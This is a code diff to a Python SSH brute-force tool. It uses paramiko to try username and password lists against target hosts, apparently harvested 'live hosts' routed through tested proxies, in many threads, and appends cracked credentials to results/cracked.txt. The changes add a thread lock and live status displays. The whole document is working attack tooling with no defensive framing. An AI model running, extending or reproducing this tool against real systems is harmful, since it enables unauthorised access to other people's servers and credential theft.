@@ -1,4 +1,7 @@
-from globals import global_live_hosts, global_tested_proxies, global_config, pause_event, stop_event
+from globals import (
+    global_live_hosts, global_tested_proxies, global_config,
+    pause_event, stop_event, brute_stats
+)
 import os
 import time
 import threading
@@ -14,13 +17,11 @@ from collections import deque
 # Ensure results directory exists
 os.makedirs("results", exist_ok=True)
 
-# Brute force statistics
-brute_stats = {"running": False, "total_attempts": 0, "success": 0, "failed": 0, "remaining": 0}
+# Thread-safe lock for updating shared stats
+lock = threading.Lock()
 
 # Limit for displaying recent attempts
 PRINT_LIMIT = 20
-
-# Store recent brute-force attempts
 recent_attempts = deque(maxlen=PRINT_LIMIT)
 
 
@@ -76,23 +77,25 @@ def attempt_login(host, username, password, proxy=None):
         # Connect using username/password
         client.connect(host, username=username, password=password, timeout=global_config.get("scan_timeout", 5))
 
-        with open("results/cracked.txt", "a") as file:
-            file.write(f"{host} {username}:{password}\n")
-
-        brute_stats["success"] += 1
-        brute_stats["remaining"] -= 1
-        recent_attempts.append([host, username, password, "Success"])
+        with lock:
+            brute_stats["success"] += 1
+            brute_stats["remaining"] -= 1
+            recent_attempts.append([host, username, password, "Success"])
 
         print_status()
         print(colored(f"[SUCCESS] {host} - {username}:{password}", "green"))
+
+        with open("results/cracked.txt", "a") as file:
+            file.write(f"{host} {username}:{password}\n")
 
         client.close()
         return True
 
     except paramiko.AuthenticationException:
-        brute_stats["failed"] += 1
-        brute_stats["remaining"] -= 1
-        recent_attempts.append([host, username, password, "Failed"])
+        with lock:
+            brute_stats["failed"] += 1
+            brute_stats["remaining"] -= 1
+            recent_attempts.append([host, username, password, "Failed"])
 
         print_status()
         return False
@@ -113,7 +116,14 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
         return
 
     global brute_stats
-    brute_stats.update({"running": True, "total_attempts": len(targets) * len(usernames) * len(passwords), "success": 0, "failed": 0, "remaining": len(targets) * len(usernames) * len(passwords)})
+    with lock:
+        brute_stats.update({
+            "running": True,
+            "total_attempts": len(targets) * len(usernames) * len(passwords),
+            "success": 0,
+            "failed": 0,
+            "remaining": len(targets) * len(usernames) * len(passwords)
+        })
 
     print("[INFO] Starting brute force attack...")
 
@@ -133,7 +143,9 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
             for future in tqdm(as_completed(futures), desc="Bruteforcing SSH", total=len(futures)):
                 future.result()
 
-        brute_stats["running"] = False
+        with lock:
+            brute_stats["running"] = False
+
         print(f"[INFO] Brute force complete. Results saved to results/cracked.txt.")
 
     # Start brute forcing in the background
@@ -143,16 +155,36 @@ def bruteforce_ssh(targets, usernames, passwords, max_threads=5):
 
 def print_status():
     """Update the terminal display dynamically with counters."""
-    success_text = colored(f"Successful: {brute_stats['success']}", "green")
-    failed_text = colored(f"Failed: {brute_stats['failed']}", "red")
-    remaining_text = colored(f"Remaining: {brute_stats['remaining']}", "yellow")
-    total_attempts_text = colored(f"Total Attempts: {brute_stats['total_attempts']}", "white")
+    with lock:
+        success_text = colored(f"Successful: {brute_stats['success']}", "green")
+        failed_text = colored(f"Failed: {brute_stats['failed']}", "red")
+        remaining_text = colored(f"Remaining: {brute_stats['remaining']}", "yellow")
+        total_attempts_text = colored(f"Total Attempts: {brute_stats['total_attempts']}", "white")
 
     print(f"\r{success_text} | {failed_text} | {remaining_text} | {total_attempts_text}", end="")
 
-
+    # Display recent brute-force attempts
     print("\nMost recent brute force attempts:")
     for attempt in reversed(recent_attempts):
         host, username, password, status = attempt
         color = "green" if status == "Success" else "red"
         print(colored(f"{host} - {username}:{password} - {status}", color))
+
+
+def clear_screen():
+    """Cross-platform clear screen."""
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def display_statistics():
+    """Show brute-force statistics dynamically with color enhancements."""
+    clear_screen()
+    print("\n" + colored("[ BRUTE FORCE STATISTICS ]", "cyan", attrs=["bold"]))
+
+    print(f"🔑 {colored('Brute-force:', 'cyan', attrs=['bold'])} "
+          f"{colored(brute_stats.get('running', 0), 'white')} Running | "
+          f"{colored(brute_stats.get('success', 0), 'green')} Success | "
+          f"{colored(brute_stats.get('failed', 0), 'red')} Failed | "
+          f"{colored(brute_stats.get('remaining', 0), 'yellow')} Remaining\n")
+
+
